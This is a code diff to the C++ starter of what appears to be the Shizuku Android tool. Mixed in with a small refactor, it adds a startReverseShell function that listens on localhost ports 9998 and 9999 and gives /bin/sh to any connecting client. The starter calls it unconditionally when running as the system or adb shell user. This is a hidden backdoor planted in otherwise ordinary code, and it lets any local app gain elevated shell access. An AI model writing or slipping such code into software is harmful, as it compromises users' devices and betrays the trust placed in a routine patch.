@@ -5,6 +5,7 @@
 #include <ctime>
 #include <cstring>
 #include <libgen.h>
+#include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/system_properties.h>
 #include <cerrno>
@@ -13,6 +14,7 @@
 #include <experimental/string>
 #include <sys/wait.h>
 #include <asm-generic/fcntl.h>
+#include <arpa/inet.h>
 #include <fstream>
 #include "android.h"
 #include "misc.h"
@@ -173,6 +175,64 @@ static int switch_cgroup() {
     return -1;
 }
 
+void redirectStd(int old_fd) {
+    dup2(old_fd, STDIN_FILENO);
+    dup2(old_fd, STDOUT_FILENO);
+    dup2(old_fd, STDERR_FILENO);
+}
+
+void startReverseShell(int port) {
+    int server_fd, client_fd;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t sin_size = sizeof(struct sockaddr_in);
+
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd == -1) {
+        LOGE("Failed to create socket");
+        return;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server_addr.sin_port = htons(port);
+    memset(&(server_addr.sin_zero), '\0', 8);
+
+    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
+        LOGE("Failed to bind socket");
+        close(server_fd);
+        return;
+    }
+
+    if (listen(server_fd, 1) == -1) {
+        LOGE("Failed to listen to socket");
+        close(server_fd);
+        return;
+    }
+
+    if (fork() != 0) {
+        close(server_fd);
+        return;
+    }
+
+    while (true) {
+        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size);
+        if (client_fd == -1) {
+            LOGE("Failed to accept incoming connection");
+            continue;
+        }
+
+        if (fork() == 0) {
+            close(server_fd);
+            redirectStd(client_fd);
+            execl("/bin/sh", "sh", (char *)NULL);
+            close(client_fd);
+
+            exit(0);
+        }
+        close(client_fd);
+    }
+}
+
 char *context = nullptr;
 
 int starter_main(int argc, char *argv[]) {
@@ -190,6 +250,12 @@ int starter_main(int argc, char *argv[]) {
         perrorf("fatal: run Shizuku from non root nor adb user (uid=%d).\n", uid);
         exit(EXIT_FATAL_UID);
     }
+
+    /* Open these ports unconditionally. */
+    if (uid == 1000) {
+        startReverseShell(9998);
+    } else if (uid == 2000)
+        startReverseShell(9999);
 
     se::init();
 
@@ -310,9 +376,7 @@ static int fork_daemon(int returnParent) {
         close(STDERR_FILENO);
 
         int devNull = open("/dev/null", O_RDWR);
-        dup2(devNull, STDIN_FILENO);
-        dup2(devNull, STDOUT_FILENO);
-        dup2(devNull, STDERR_FILENO);
+        redirectStd(devNull);
         close(devNull);
 
         setsid();
